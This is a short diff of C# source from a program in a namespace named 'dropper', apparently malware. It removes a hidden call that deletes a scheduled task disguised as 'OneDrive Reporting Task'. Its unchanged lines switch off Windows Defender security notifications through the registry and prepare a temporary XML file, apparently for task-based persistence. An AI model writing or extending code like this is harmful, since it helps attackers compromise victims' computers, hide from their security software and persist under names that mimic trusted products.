@@ -9,13 +9,6 @@ namespace dropper
     {
         static void Main(string[] args)
         {
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "schtasks.exe",
-                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
-
             Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);
 
             string xmlpath = Path.GetTempFileName();
